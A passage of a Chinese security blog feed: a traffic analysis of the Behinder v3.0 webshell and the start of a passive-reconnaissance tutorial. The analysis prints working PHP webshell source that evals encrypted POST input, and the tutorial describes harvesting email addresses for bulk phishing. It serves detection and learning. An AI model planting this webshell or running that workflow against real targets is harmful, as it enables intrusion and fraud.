/></p>\n<p>发现加密器不同，追踪流的数据也就自然不同，该加密器下请求体解密方法为先 base64 后解 xor，在解密脚本找到相对应的解密模块试试</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pO8s8NXrSMbCQSW1.png!thumbnail\" alt=\"\" /></p>\n<p>也同样能够看到 ls / 命令之下的回显</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/8w1r9fuqq7S2pF0S.png!thumbnail\" alt=\"\" /></p>\n<p>切换下一个请求体与响应体对应解密</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/wmj2C45JJcjWfYeC.png!thumbnail\" alt=\"\" /></p>\n<p>能够看到 ls 命令的回显</p>\n<p>对比了 PHP_EVAL_XOR_BASE64 和 PHP_XOR_BASE64 之后能够发现，PHP_EVAL_XOR_BASE64 下的请求体与响应体基本是一个流对应一条命令，而 PHP_XOR_BASE64 可以是多条命令的请求体与响应体存在同一个流之中</p>\n",
            "tags": [
                "流量",
                "流量"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E5%86%B0%E8%9D%8Ev3.0%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/",
            "url": "https://nnnpc.github.io/2024/04/16/%E5%86%B0%E8%9D%8Ev3.0%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/",
            "title": "冰蝎v3.0流量浅析",
            "date_published": "2024-04-16T05:58:19.043Z",
            "content_html": "<p>近期稍微对冰蝎的流量进行了一些分析，因此来记录一下</p>\n<p>首先用的工具是冰蝎 3.0 版本的，它相对于 2.0 来说，做出了一些改动，个人认为比较大的一个特点就是取消了动态密钥的获取，也就是说如果只是在一个加密的命令执行的追踪流下，是无法获取到加密后的密钥的，这里在 NSSCTF 开了一个 DVWA 的环境来进行一个上传的 getshell 演示</p>\n<p>首先直接在上传口上传蚁剑 v3.0 的 shell.php，这里就用 php 来进行演示</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4DCN2h1wG1fpqHRz.png!thumbnail\" alt=\"\" /></p>\n<p>可以看到的是上传成功和路径，接下来进行冰蝎的连接</p>\n<p>首先点击新增</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pOhbzvHyt49soKp2.png!thumbnail\" alt=\"\" /></p>\n<p>在弹出来的页面编辑好 url 和密码</p>\n<p>这里先来看一下 shell.php</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">@error_reporting(0);</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">    $key=&quot;e45e329feb5d925b&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span><br><span class=\"line\">    $_SESSION[&#x27;k&#x27;]=$key;</span><br><span class=\"line\">    $post=file_get_contents(&quot;php://input&quot;);</span><br><span class=\"line\">    if(!extension_loaded(&#x27;openssl&#x27;))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $t=&quot;base64_&quot;.&quot;decode&quot;;</span><br><span class=\"line\">        $post=$t($post.&quot;&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        for($i=0;$i&lt;strlen($post);$i++) &#123;</span><br><span class=\"line\">                 $post[$i] = $post[$i]^$key[$i+1&amp;15]; </span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $post=openssl_decrypt($post, &quot;AES128&quot;, $key);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $arr=explode(&#x27;|&#x27;,$post);</span><br><span class=\"line\">    $func=$arr[0];</span><br><span class=\"line\">    $params=$arr[1];</span><br><span class=\"line\">    class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</span><br><span class=\"line\">    @call_user_func(new C(),$params);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<p>能看到的是 e45e329feb5d925b 这一串 md5 的前 16 位，后面有注释显示的是密钥就是该 md5 为 rebeyond，那么就以这个作为连接密码进行冰蝎连接</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/AzQcYoF255TLV9EC.png!thumbnail\" alt=\"\" /></p>\n<p>保存之后双击添加的数据</p>\n<p>成功连接</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/jiuskQYcIeZy6cqA.png!thumbnail\" alt=\"\" /></p>\n<p>接下来使用 wireshark 进行抓包分析</p>\n<p>同样在捕获 -&gt; 选项设置好 WLAN 进行抓包</p>\n<p>接着在命令执行框中输入以下三条命令：</p>\n<ol>\n<li>\n<p>ls /</p>\n</li>\n<li>\n<p>ls /tmp</p>\n</li>\n<li>\n<p>ls /usr</p>\n</li>\n</ol>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ItNIH1gcHM6NhruL.png!thumbnail\" alt=\"\" /></p>\n<p>接着停止抓取流量进行分析</p>\n<p>首先先看到了 tcp 追踪流 23</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/yLew2mlMcyrrEeO4.png!thumbnail\" alt=\"\" /></p>\n<p>很明显的一个冰蝎流量加密，冰蝎的流量加密的最大一个特点就是先进行一次 base64 加密，再进行一次 AES 加密，至于冰蝎流量的特点：</p>\n<ol>\n<li>User-Agent</li>\n</ol>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.163 Safari/535.1</span><br><span class=\"line\">Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0 </span><br><span class=\"line\">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50</span><br><span class=\"line\">Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.9.168 Version/144 255 173)&quot;&gt;11.50</span><br><span class=\"line\">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; Tablet PC 2.0; .NET4.0E)</span><br><span class=\"line\">Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3)</span><br><span class=\"line\">Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.0)</span><br><span class=\"line\">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)</span><br><span class=\"line\">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</span><br><span class=\"line\">Mozilla/5.0 (Windows; U; Windows NT 6.1; ) AppleWebKit/534.12 (KHTML, like Gecko) Maxthon/3.0 Safari/534.12</span><br><span class=\"line\">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)</span><br><span class=\"line\">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E; SE 2.X MetaSr 1.0)</span><br><span class=\"line\">Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.472.33 Safari/534.3 SE 2.X MetaSr 1.0</span><br><span class=\"line\">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)</span><br><span class=\"line\">Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/144 255 173)&quot;&gt;13.0.782.41 Safari/535.1 QQBrowser/6.9.144 255 173)&quot;&gt;11079.201</span><br><span class=\"line\">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E) QQBrowser/6.9.144 255 173)&quot;&gt;11079.201</span><br><span class=\"line\">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)</span><br></pre></td></tr></table></figure></p>\n<ol>\n<li>长连接<br />\n冰蝎默认使用的是长连接，因此能看到</li>\n</ol>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MiLBm3HewNzi6SZ6.png!thumbnail\" alt=\"\" /></p>\n<p>Connection 为 keep-alive</p>\n<ol>\n<li>Accept<br />\n 冰蝎的 Accept 字段很特殊，如图所示的请求体 Accept 字段</li>\n</ol>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6Rfq52djVgr0tpjs.png!thumbnail\" alt=\"\" /></p>\n<p>可以在这里调整是查看请求包还是回应包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6S3tFiquxDFzKkaC.png!thumbnail\" alt=\"\" /></p>\n<p>接下来先将请求的加密字段拿去解密</p>\n<p>这里附上我使用的 aes 解密和 base64 解密网址：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90aGUteC5jbi9jcnlwdG9ncmFwaHkvQWVzLmFzcHg=\">https://the-x.cn/cryptography/Aes.aspx</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYubXp5MC5jb20vQ3liZXJDaGVmMy8=\">https://ctf.mzy0.com/CyberChef3/</span></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/aQgCMfOWwhWkM9j5.png!thumbnail\" alt=\"\" /></p>\n<p>这里说明一下，在解密时需要将 aes 的加密模式调整为 CBC</p>\n<p>key 为上传的 shell.php 中的 16 位加密的密钥即 e45e329feb5d925b</p>\n<p>而偏移量默认为 0123456789abcdef</p>\n<p>可以看到的是有一个 decode 标识着括号里的 base64 码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pGTGwJsgs1qeMbL1.png!thumbnail\" alt=\"\" /></p>\n<p>将 base64 复制下来放入网站中成功解密，而输出的这段代码便是冰蝎对我们命令执行时的加密代码，也同时可以在底部查看到我们输入的命令</p>\n<p>追踪流 23：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9ofiyS7wJA73jR6v.png!thumbnail\" alt=\"\" /></p>\n<p>继续这样去找，能够找到我们之前输入的三个命令</p>\n<p>追踪流 29：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/5PaASe86v1dEeqz4.png!thumbnail\" alt=\"\" /></p>\n<p>追踪流 34：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/xLBjKqlvupY4LhSu.png!thumbnail\" alt=\"\" /></p>\n<p>接下来切换一下左下角的选项，查看回应包</p>\n<p>追踪流 23：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4jmut6UKg3yewmBU.png!thumbnail\" alt=\"\" /></p>\n<p>一样进行 AES 解密 -&gt;base64 解密</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZeLLHx28qrcMBUKr.png!thumbnail\" alt=\"\" /></p>\n<p>将后面这段复制出来进行 base64 解密</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/WT5iDXH8RF4wdb1r.png!thumbnail\" alt=\"\" /></p>\n<p>能发现成功和我们之前执行命令时的回显对上了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1jEMDZtPmWalFSVV.png!thumbnail\" alt=\"\" /></p>\n<p>接下来的两个也都是一样</p>\n<p>追踪流 29：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LPVSKZHY9omPgvQI.png!thumbnail\" alt=\"\" /></p>\n<p>由于流 29 执行的命令是 ls<br />\n/tmp，而 tmp 目录下没有东西，回显也能看到，因此解密出来为空</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bofnsQu1ctbjzk4z.png!thumbnail\" alt=\"\" /></p>\n<p>追踪流 34：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/EKk6b3I5Je4ZlU9Z.png!thumbnail\" alt=\"\" /></p>\n<p>也是成功和回显对上了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9fsjWNUUeyEMOWkg.png!thumbnail\" alt=\"\" /></p>\n<p>回到开头所讲述的冰蝎 3.0 版本没有了动态密钥的获取，因此只有攻击者能够知道密钥是什么，而 2.0 的密钥是能够通过流量进行抓取的（抓取的是加密之后的密钥），相当于是密钥随身跟随，另外冰蝎还有许多的功能之后再慢慢研究</p>\n<p>本片文章是个人的一些看法，还望师傅们多多提建议</p>\n<blockquote>\n<p>PS：最近开放了，还望师傅们多注意身体，别像我一样🐏了个🐏</p>\n</blockquote>\n",
            "tags": [
                "流量",
                "流量"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "url": "https://nnnpc.github.io/2024/04/16/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "title": "被动信息收集",
            "date_published": "2024-04-16T05:58:19.043Z",
            "content_html": "<p>信息收集通常可以分为<strong>被动信息收集</strong>和 ** 主动信息收集，** 被动信息收集是指不与目标主机进行直接交互，通常根据搜索引擎或者社交等方式间接获取目标主机的信息；主动信息收集是指与目标主机进行直接交互，从而获取所需要的目标信息</p>\n<p>攻击者比较关注目标主机的所有信息，比如：子域名、IP 地址、旁站、C 段查询、用户邮箱 CMS 类型、敏感目录、端口信息、服务器版本以及中间件等</p>\n<p>被动信息收集主要是通过一些收集引擎例如 fofa、鹰图等等进行收集、或者通过一些社交方式来获得一些信息。该方法是不与目标机子产生交互的，可以不接触目标的情况下挖掘目标信息。主要方法包括：DNS 解析、子域名挖掘、邮件爬取等等</p>\n<p><strong>DNS 解析</strong></p>\n<p>DNS 是一种分布式网络目录服务，主要用于域名与 ip 地址的相互转换，能够使用户更方便地访问互联网，TCP/IP 中的 IP 地址是由四段以 &quot;.&quot; 分开地数字组成，记起来总是不如名字那么方便，所以采用了域名系统来管理名字和 IP 地对应关系</p>\n<p><strong>IP 查询</strong></p>\n<p>IP 查询是通过当前所获取到的 URL 去查询对应 IP 地址的过程。可以应用 Socket 库函数中的 gethostbyname () 获取域名所对应的 IP 值</p>\n<p>例：查询域名<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmFpZHUueG4tLWNvbS1scTBmMzhpZDlneG01Yg==\"> www.baidu.com</span> 所对应的 IP 值</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import socket</span><br><span class=\"line\">ip = socket.gethostbyname(&#x27;www.baidu.com&#x27;)</span><br><span class=\"line\">print(ip)</span><br></pre></td></tr></table></figure></p>\n<p>输出结果：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">112.80.248.75</span><br></pre></td></tr></table></figure></p>\n<p><strong>Whois 查询</strong></p>\n<p>Whois 是用来查询域名的 IP 以及所有者信息的传输协议。简单地说，Whois 就是一个数据库，用来查询域名是否已经被注册，以及注册域名的详细信息（如域 - 名所有人、域名注册商等）。Python 中的 python-whois 模块可以用于 Whois 的查询</p>\n<p>先通过 pip 安装 python-whois 模块：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install python-whois·</span><br></pre></td></tr></table></figure></p>\n<p>通过自带的 whois 模块查询域名<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmFpZHUuY29t\"> www.baidu.com</span><br />\n 的注册信息</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from whois import whois</span><br><span class=\"line\">data = whois(&#x27;www.baidu.com&#x27;)</span><br><span class=\"line\">print(data)</span><br></pre></td></tr></table></figure></p>\n<p>输出结果：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;domain_name&quot;: [</span><br><span class=\"line\">    &quot;BAIDU.COM&quot;,</span><br><span class=\"line\">    &quot;baidu.com&quot;</span><br><span class=\"line\">  ],</span><br><span class=\"line\">  &quot;registrar&quot;: &quot;MarkMonitor, Inc.&quot;,</span><br><span class=\"line\">  &quot;whois_server&quot;: &quot;whois.markmonitor.com&quot;,</span><br><span class=\"line\">  &quot;referral_url&quot;: null,</span><br><span class=\"line\">  &quot;updated_date&quot;: [</span><br><span class=\"line\">    &quot;2022-09-01 03:54:43&quot;,</span><br><span class=\"line\">    &quot;2022-09-01 03:29:31&quot;</span><br><span class=\"line\">  ],</span><br><span class=\"line\">  &quot;creation_date&quot;: &quot;1999-10-11 11:05:17&quot;,</span><br><span class=\"line\">  &quot;expiration_date&quot;: [</span><br><span class=\"line\">    &quot;2026-10-11 11:05:17&quot;,</span><br><span class=\"line\">    &quot;2026-10-11 07:00:00&quot;</span><br><span class=\"line\">  ],</span><br><span class=\"line\">  &quot;name_servers&quot;: [</span><br><span class=\"line\">    &quot;NS1.BAIDU.COM&quot;,</span><br><span class=\"line\">    &quot;NS2.BAIDU.COM&quot;,</span><br><span class=\"line\">    &quot;NS3.BAIDU.COM&quot;,</span><br><span class=\"line\">    &quot;NS4.BAIDU.COM&quot;,</span><br><span class=\"line\">    &quot;NS7.BAIDU.COM&quot;,</span><br><span class=\"line\">    &quot;ns7.baidu.com&quot;,</span><br><span class=\"line\">    &quot;ns4.baidu.com&quot;,</span><br><span class=\"line\">    &quot;ns1.baidu.com&quot;,</span><br><span class=\"line\">    &quot;ns2.baidu.com&quot;,</span><br><span class=\"line\">    &quot;ns3.baidu.com&quot;</span><br><span class=\"line\">  ],</span><br><span class=\"line\">  &quot;status&quot;: [</span><br><span class=\"line\">    &quot;clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited&quot;,</span><br><span class=\"line\">    &quot;clientTransferProhibited https://icann.org/epp#clientTransferProhibited&quot;,</span><br><span class=\"line\">    &quot;clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited&quot;,</span><br><span class=\"line\">    &quot;serverDeleteProhibited https://icann.org/epp#serverDeleteProhibited&quot;,</span><br><span class=\"line\">    &quot;serverTransferProhibited https://icann.org/epp#serverTransferProhibited&quot;,</span><br><span class=\"line\">    &quot;serverUpdateProhibited https://icann.org/epp#serverUpdateProhibited&quot;,</span><br><span class=\"line\">    &quot;clientUpdateProhibited (https://www.icann.org/epp#clientUpdateProhibited)&quot;,</span><br><span class=\"line\">    &quot;clientTransferProhibited (https://www.icann.org/epp#clientTransferProhibited)&quot;,</span><br><span class=\"line\">    &quot;clientDeleteProhibited (https://www.icann.org/epp#clientDeleteProhibited)&quot;,</span><br><span class=\"line\">    &quot;serverUpdateProhibited (https://www.icann.org/epp#serverUpdateProhibited)&quot;,</span><br><span class=\"line\">    &quot;serverTransferProhibited (https://www.icann.org/epp#serverTransferProhibited)&quot;,</span><br><span class=\"line\">    &quot;serverDeleteProhibited (https://www.icann.org/epp#serverDeleteProhibited)&quot;</span><br><span class=\"line\">  ],</span><br><span class=\"line\">  &quot;emails&quot;: [</span><br><span class=\"line\">    &quot;abusecomplaints@markmonitor.com&quot;,</span><br><span class=\"line\">    &quot;whoisrequest@markmonitor.com&quot;</span><br><span class=\"line\">  ],</span><br><span class=\"line\">  &quot;dnssec&quot;: &quot;unsigned&quot;,</span><br><span class=\"line\">  &quot;name&quot;: null,</span><br><span class=\"line\">  &quot;org&quot;: &quot;Beijing Baidu Netcom Science Technology Co., Ltd.&quot;,</span><br><span class=\"line\">  &quot;address&quot;: null,</span><br><span class=\"line\">  &quot;city&quot;: null,</span><br><span class=\"line\">  &quot;state&quot;: &quot;Beijing&quot;,</span><br><span class=\"line\">  &quot;registrant_postal_code&quot;: null,</span><br><span class=\"line\">  &quot;country&quot;: &quot;CN&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>子域名挖掘</strong></p>\n<p>域名可以分为顶级域名、一级域名、二级域名。子域名是顶级域名（一级域名或父域名）的下一级，例如 mail.example.com 和 calendar.example.com 是 example.com 的两个子域而 example.com 则是顶级域.com 的子域。在测试过程中，测试目标主站时如果未发现任何相关漏洞，此时通常会考虑挖掘目标系统的子域名。子域名的挖掘方式有很多种，例如：搜索引擎、子域名破解、字典查询等等</p>\n<p>这里用 python 写一个子域名的挖掘工具（通过 Bing 搜索引擎进行子域名搜集）：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#! /usr/bin/env python</span><br><span class=\"line\"># _*_ coding:utf-8_*_</span><br><span class=\"line\">import requests</span><br><span class=\"line\">from bs4 import BeautifulSoup</span><br><span class=\"line\">from urllib.parse import urlparse</span><br><span class=\"line\">import sys</span><br><span class=\"line\"></span><br><span class=\"line\">def bing_search(site,pages):</span><br><span class=\"line\">    Sudbomain = []</span><br><span class=\"line\">    headers = &#123;</span><br><span class=\"line\">        &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (X11; Linux x86_64; rv:68.0)Gecko/20100101 Firefox/68.0&#x27;</span><br><span class=\"line\">        &#x27;Accept&#x27;:&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;,</span><br><span class=\"line\">        &#x27;Referer&#x27;:&quot;https://cn.bing.com&quot;,</span><br><span class=\"line\">        &#x27;Cookie&#x27;:&quot;MUID=3B16E5B***********782&amp;t=6&quot; #填写相应的Cookie值</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    for i in range(1,int(pages)+1):</span><br><span class=\"line\">        url = &quot;https://cn.bing.com/search?q=site%3a&quot;+site+&quot;&amp;go=Search&amp;ds&amp;first=&quot;+ str((int(i)-1)*10) +&quot;&amp;FROM=PERE&quot;</span><br><span class=\"line\">        html = requests.get(url,headers=headers)</span><br><span class=\"line\">        soup = BeautifulSoup(html.content,&#x27;html.parser&#x27;)</span><br><span class=\"line\">        job_bt = soup.findAll(&#x27;h2&#x27;)</span><br><span class=\"line\">        for i in job_bt:</span><br><span class=\"line\">            link = i.a.get(&#x27;href&#x27;)</span><br><span class=\"line\">            domain = str(urlparse(link).scheme + &quot;://&quot; + urlparse(link).netloc)</span><br><span class=\"line\">            if domain in Subdomain:</span><br><span class=\"line\">                pass</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                Subdomain.append(domain)</span><br><span class=\"line\">                print(domain)</span><br><span class=\"line\">if __name__ == &#x27;_main_&#x27;:</span><br><span class=\"line\">    if len(sys.argv) == 3:</span><br><span class=\"line\">        site = sys.argv[1]</span><br><span class=\"line\">        page = sys.argv[2]</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print(&quot;usage: %s baidu.com 10&quot;% sys.argv[0]) #输出帮助信息</span><br><span class=\"line\">        sys.exit(-1)</span><br><span class=\"line\">    Subdomain = bing_search(site,page)</span><br></pre></td></tr></table></figure></p>\n<p><strong>邮件爬取</strong></p>\n<blockquote>\n<p>在针对目标系统进行渗透的过程中，如果目标服务器安全性很高，通过服务器很难获取目标权限时，通常会采用社工的方式对目标服务进行进一步的攻击。邮件钓鱼攻击是常见的攻击方式之一。在进行钓鱼之前，需要针对目标相关人员的邮件信息进行全面采集。<br />\n此处邮件采集工具主要通过国内常见的搜索引擎（百度、Bing 等进行搜集）。针对搜索界面的相关邮件信息进行爬取、处理等操作之后。利用获得的邮箱账号批量发送钓鱼邮件，等待目标用户或者管理员点击之后执行，进而获得目标的权限<br />\n邮件采集工具所用到的库如下所示</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import sys</span><br><span class=\"line\">import getopt</span><br><span class=\"line\">import request</span><br><span class=\"line\">from bs4 import BeautifulSoup</span><br><span class=\"line\">import re</span><br></pre></td></tr></table></figure></p>\n<p>在程序的起始部分，在执行过程中没有发生异常时，则执行定义的 start () 函数。通过 sys.argv [] 实现外部指令的接受。其中，sys.argv [0] 